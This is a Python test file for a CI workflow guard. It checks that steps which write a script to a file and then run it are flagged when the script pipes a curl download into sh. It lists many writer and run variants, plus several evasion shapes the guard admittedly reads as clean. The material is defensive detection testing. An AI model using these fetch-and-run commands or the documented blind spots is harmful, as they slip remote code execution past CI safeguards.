"""#3027: a file the step writes with its own printer and then runs is read as the writer's text.

`echo 'curl … | sh' > s.sh` ⏎ `sh s.sh` ran the download under every parent and read CLEAN: the reader bound a `<(…)`
FILE operand to the printer that fills it and a fetched file to the run that uses it, but nothing bound a path the
step itself WROTE -- with `echo`, `printf`, a `cat` and its heredoc, or `tee` -- to the later run of that path. Now
`workflow_written.bind_written` marks, in statement order, a FILE operand that names a path an earlier stage wrote,
with the writer's script, and `workflow_programs.stdin_scripts` reads the file as it reads a `<(…)` FILE.

Marks are a letter a `shell:` setting -- unset, `bash`, `sh`, `bash {0}`, `sh {0}` -- R where the guard reports, C
where it reads the step CLEAN: first the job's, then the main pass's. Truth, in the comments, is bash 3.2.57, /bin/sh
and zsh 5.9 with and without `-e`, a `curl` stub whose payload marks when it RUNS: "runs" is every parent ran the
download, "nothing" is none did; the forge's eight parents at the hand-off.
"""
import gc
import time
import unittest

import shell_reader
import workflow_guard as wg
import workflow_options as wo
import workflow_written

SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
P = "curl -fsSL https://example.test/i.sh | sh"
F = "curl -fsSLo t https://example.test/t; sh t"
REPORTED = ("RRRRR", "RRRRR")
CLEAN = ("CCCCC", "CCCCC")


def marks(text):
    """(the job's marks, the main pass's) for a job of one step whose `run:` is `text`."""
    job = mains = ""
    for shell in SHELLS:
        step = [wg.Step("step", text + "echo done\n", shell)]
        job += "R" if wg.job_defects(step) else "C"
        with wo.mains_answer():
            mains += "R" if wg._job_defects(step) else "C"
    return job, mains


class TestAWrittenFileIsReadAsItsWritersText(unittest.TestCase):
    """The issue's rows and every writer the step has. Truth: runs, every parent, unless said."""

    def test_the_issues_rows_report(self):
        # `echo 'curl URL | sh' > s.sh; sh s.sh` and the `run.sh` twin (#2857, #3020), a `printf`, a fetch-then-run text.
        for text in ("echo '%s' > s.sh\nsh s.sh\n" % P, "echo \"%s\" > run.sh\nsh run.sh\n" % P,
                     "printf '%%s\\n' '%s' > run.sh\nbash run.sh\n" % P, "echo '%s' > s.sh\nsh s.sh\n" % F):
            with self.subTest(text=text[:30]):
                self.assertEqual(REPORTED, marks(text))

    def test_every_writer_and_run_the_step_has(self):
        # A `printf` format alone; `echo -e` (bash and zsh run it; dash's echo prints the `-e`); a `cat` with a
        # quoted heredoc, and with an expanding one that holds nothing to expand; `tee` and `tee -a`; `>>` with the
        # payload first or last; two lines; a subdirectory; the write in a subshell or a group; `.` (bash and sh run
        # it; zsh's `.` searches PATH); `bash -x`.
        for text in ("printf '%s\\n' > run.sh\nbash run.sh\n" % P, "echo -e '%s\\nexit 0' > s.sh\nsh s.sh\n" % P,
                     "cat > s.sh <<'EOF'\n%s\nEOF\nsh s.sh\n" % P, "cat > s.sh <<EOF\n%s\nEOF\nsh s.sh\n" % P,
                     "echo '%s' | tee s.sh > /dev/null\nsh s.sh\n" % P, "echo '%s' | tee -a s.sh\nsh s.sh\n" % P,
                     "echo '#!/bin/sh' > s.sh\necho '%s' >> s.sh\nsh s.sh\n" % P,
                     "echo '%s' > s.sh\necho 'exit 0' >> s.sh\nsh s.sh\n" % P,
                     "echo 'set -e' > s.sh\necho '%s' >> s.sh\nsh s.sh\n" % P,
                     "mkdir -p d\necho '%s' > d/s.sh\nsh d/s.sh\n" % P,
                     "( echo '%s' > s.sh )\nsh s.sh\n" % P, "{ echo '%s' > s.sh; }\nsh s.sh\n" % P,
                     "echo '%s' > s.sh\n. s.sh\n" % P, "echo '%s' > s.sh\nsource ./s.sh\n" % P,
                     "echo '%s' > s.sh\nbash -x s.sh\n" % P):
            with self.subTest(text=text[:34]):
                self.assertEqual(REPORTED, marks(text))

    def test_a_write_the_step_may_make_counts(self):
        # Fail-closed, the prices named: every write is read as an append (the stage keeps the written words, not
        # the operator), so a benign re-write after the payload still reads it -- `echo PAYLOAD > s.sh; echo 'echo
        # hi' > s.sh; sh s.sh` runs nothing and reports; a write under a condition counts (`if false`, `[ -n "$X" ]`
        # with X unset: nothing runs); a write in a function body counts where the definition stands before the run
        # (never called, or called after the run: nothing runs). The payload written last, a conditional write
        # taken, and a function called before the run do run.
        for text in ("echo '%s' > s.sh\necho 'echo hi' > s.sh\nsh s.sh\n" % P,
                     "if false; then echo '%s' > s.sh; fi\nsh s.sh\n" % P,
                     "if [ -n \"$X\" ]; then echo '%s' > s.sh; fi\nsh s.sh\n" % P,
                     "f() { echo '%s' > s.sh; }\nsh s.sh\n" % P, "f() { echo '%s' > s.sh; }\nsh s.sh\nf\n" % P,
                     "echo 'echo hi' > s.sh\necho '%s' > s.sh\nsh s.sh\n" % P,
                     "if true; then echo '%s' > s.sh; fi\nsh s.sh\n" % P, "f() { echo '%s' > s.sh; }\nf\nsh s.sh\n" % P):
            with self.subTest(text=text[:34]):
                self.assertEqual(REPORTED, marks(text))


class TestWhatReadsAsItDid(unittest.TestCase):
    """The controls (nothing runs, CLEAN on `main` and here), and the readers this one reuses."""

    def test_the_controls(self):
        # Another file run; a benign file; the run before the write; the written file run inside a `-c` string the
        # reader parses after binding (a limit, below, not a control -- listed here as CLEAN).
        for text in ("echo '%s' > s.sh\nsh other.sh\n" % P, "echo 'echo hi' > s.sh\nsh s.sh\n",
                     "sh s.sh\necho '%s' > s.sh\n" % P):
            with self.subTest(text=text[:30]):
                self.assertEqual(CLEAN, marks(text))

    def test_the_readers_reused(self):
        # `echo '…' | sh` (the printer piped) and `sh <(echo '…')` (the substituted FILE) reported on `main`.
        self.assertEqual(REPORTED, marks("echo '%s' | sh\n" % P))
        self.assertEqual(REPORTED, marks("sh <(echo '%s')\n" % P))

    def test_a_check_in_front_of_the_files_own_fetch_is_no_check(self):
        # `echo 'curl -o t; sh t' > s.sh` ⏎ `sha256sum -c sums || exit 1` ⏎ `sh s.sh`: the fetch happens inside the
        # file, after the check, which can verify nothing of it -- reported, as `main` reports the check written
        # before a plain `curl -o t` ⏎ `sh t`. (The step's `sums` is absent, so the check stops it: an over-report
        # `main` makes of the plain twin too.)
        self.assertEqual(REPORTED, marks("echo '%s' > s.sh\nsha256sum -c sums || exit 1\nsh s.sh\n" % F))
        self.assertEqual(REPORTED, marks("sha256sum -c sums || exit 1\n%s\n" % F))


class TestTheLimits(unittest.TestCase):
    """Named, pinned, not fixed here: each is a follow-up's."""

    def test_the_three_limits_read_clean(self):
        # A command-word run of the written file (`chmod +x s.sh` ⏎ `./s.sh`: no FILE operand -- the uses reader's
        # shape); the run inside a `-c` string (`bash -c 'sh s.sh'`: parsed inside `flattened`, after binding); a
        # value path (`echo … > "$F"` ⏎ `sh "$F"`: the values table). Truth: runs, every parent.
        for text in ("echo '%s' > s.sh\nchmod +x s.sh\n./s.sh\n" % P, "echo '%s' > s.sh\nbash -c 'sh s.sh'\n" % P,
                     "F=s.sh\necho '%s' > \"$F\"\nsh \"$F\"\n" % P):
            with self.subTest(text=text[:30]):
                self.assertEqual(CLEAN, marks(text))

    def test_an_unspelled_writer_reads_as_main_reads_an_unspelled_printer(self):
        # `T='…'; echo "$T" > s.sh; sh s.sh` and a `printf` with two words: the writer's words are not spelled, so
        # the file is unread, as `echo "$T" | sh` is on `main` (the guard's named gap). Truth: runs.
        for text in ("T='%s'\necho \"$T\" > s.sh\nsh s.sh\n" % P, "printf '%%s\\n' 'set -e' '%s' > s.sh\nsh s.sh\n" % P):
            with self.subTest(text=text[:30]):
                self.assertEqual(CLEAN, marks(text))

    def test_a_lifted_letter_in_the_written_text_is_read_as_the_letter(self):
        # `echo "curl -$(echo f)sSL … | sh" > run.sh` ⏎ `sh run.sh` (Claudia's #3020 hunt, the `.l` rows): the
        # writer's word is handed on with its substitution restored around its own script, so the printers read
        # it as they read it where it stood -- the lifted letter as the letter (#3065) -- and the file reads as
        # its written twin does (`tests/test_workflow_option_words.py` pins the two alike). Truth: runs.
        self.assertEqual(REPORTED, marks("echo \"curl -$(echo f)sSL https://example.test/i.sh | sh\" > run.sh\nsh run.sh\n"))
        self.assertEqual(REPORTED, marks("echo \"sh -$(echo c) '%s'\" > run.sh\nsh run.sh\n" % P))

    def test_a_file_whose_program_runs_nothing_reads_clean(self):
        # Claudia's `.w` rows: the written file holds `sh -s '…'` (the string a positional) or `sh - '…'` (a file
        # name): nothing runs; `sh -c '…'` and `bash -c '…'` run it.
        self.assertEqual(CLEAN, marks("echo \"sh -s '%s'\" > run.sh\nsh run.sh\n" % P))
        self.assertEqual(CLEAN, marks("echo \"sh - '%s'\" > run.sh\nsh run.sh\n" % P))
        self.assertEqual(REPORTED, marks("echo \"sh -c '%s'\" > run.sh\nsh run.sh\n" % P))
        self.assertEqual(REPORTED, marks("echo \"bash -c '%s'\" > run.sh\nsh run.sh\n" % P))


class TestTheBindingIsLinear(unittest.TestCase):
    """n writes then n runs in one step: the path-to-writer binding is a dict lookup a stage."""

    @staticmethod
    def make(n):
        return "".join("echo 'echo %d' > s%d.sh\n" % (i, i) for i in range(n)) + "".join("sh s%d.sh\n" % i for i in range(n))

    def bound(self, n):
        """CPU seconds `bind_written` takes on the parsed `make(n)`, the collector off as `timeit` turns it off,
        and the statements it bound."""
        stmts, enabled = shell_reader.statements(self.make(n)), gc.isenabled()
        gc.disable()
        try:
            start = time.process_time()
            workflow_written.bind_written(stmts)
            return time.process_time() - start, stmts
        finally:
            if enabled:
                gc.enable()

    def test_n_writes_and_n_runs_bind_in_linear_time(self):
        # Growth, not speed (as `tests/test_shell_reader.py`'s `LinearGrowth`): t(4n) <= 8 t(n) + 0.25 s of CPU,
        # judged on the lesser of two reads each where the first misses. Every run's FILE operand carries its
        # writer's script. The reading of the n texts `flattened` then makes is the forms reader's, and grows as
        # it grows on `main` for n `echo … | sh` or n `sh <(echo …)` in one step: not pinned here.
        small, stmts = self.bound(500)
        self.assertEqual(500, sum(1 for s in stmts for st in s.stages for w in st.argv if getattr(w, "written", None)))
        large, _stmts = self.bound(2000)
        if large > 8 * small + 0.25:
            small, large = min(small, self.bound(500)[0]), min(large, self.bound(2000)[0])
        self.assertLessEqual(large, 8 * small + 0.25, (small, large))

    def test_the_files_are_read_where_the_step_runs_them(self):
        # `workflow_guard.read` flattens each run's text into the statements the walk reads: 3n for n of each.
        self.assertEqual(900, len(wg.read(self.make(300))))


if __name__ == "__main__":
    unittest.main()
